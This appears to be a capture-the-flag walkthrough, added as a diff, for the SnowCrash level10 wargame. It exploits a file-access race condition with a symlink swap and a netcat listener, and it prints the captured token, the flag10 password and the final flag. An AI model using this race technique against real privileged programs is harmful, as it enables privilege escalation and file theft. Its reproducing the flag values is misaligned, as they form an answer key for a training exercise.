@@ -1,0 +1,66 @@
+# We have 2 files, token and a binary level10
+
+level10@SnowCrash:~$ ./level10
+./level10 file host
+	sends file to host if you have access to it
+
+# We dont have access to token :(
+
+# After a little bit or reverse, we see that level10 is listening
+	to port 6969
+
+# First, let's listen to this port with netcat
+level10@SnowCrash:~$ nc -lk 6969
+
+# This is a typical case of a race condition
+	The goal here is to change the content of the file just after we passed
+	the access check
+	So we have a script (exploit.sh) that spam the creation a file
+	(/tmp/race) + symlink on our target file token
+
+# Then a second script (exploit_run.sh) that runs the program in a loop, we must catch the
+	symlink creation a the right moment so it may take time until we win
+	the race
+
+======================================================================
+EXPLOIT SIDE:
+level10@SnowCrash:~$ sh /tmp/exploit.sh
+# The script is looping and creating / deleting the symlink between our
+	files
+
+EXPLOIT_RUN SIDE:
+level10@SnowCrash:~$ sh /tmp/exploit_run.sh
+[...]
+You don't have access to /tmp/race
+You don't have access to /tmp/race
+You don't have access to /tmp/race
+You don't have access to /tmp/race
+You don't have access to /tmp/race
+You don't have access to /tmp/race
+You don't have access to /tmp/race
+You don't have access to /tmp/race
+You don't have access to /tmp/race
+You don't have access to /tmp/race
+Connecting to 127.0.0.1:6969 .. Connected!
+Sending file .. wrote file!
+
+NETCAT SIDE:
+level10@SnowCrash:~$ nc -lk 6969
+[...]
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+
+# We've won the race :D our token is now displayed in our listener
+
+level10@SnowCrash:~$ su flag10
+Password: woupa2yuojeeaaed06riuj63c
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
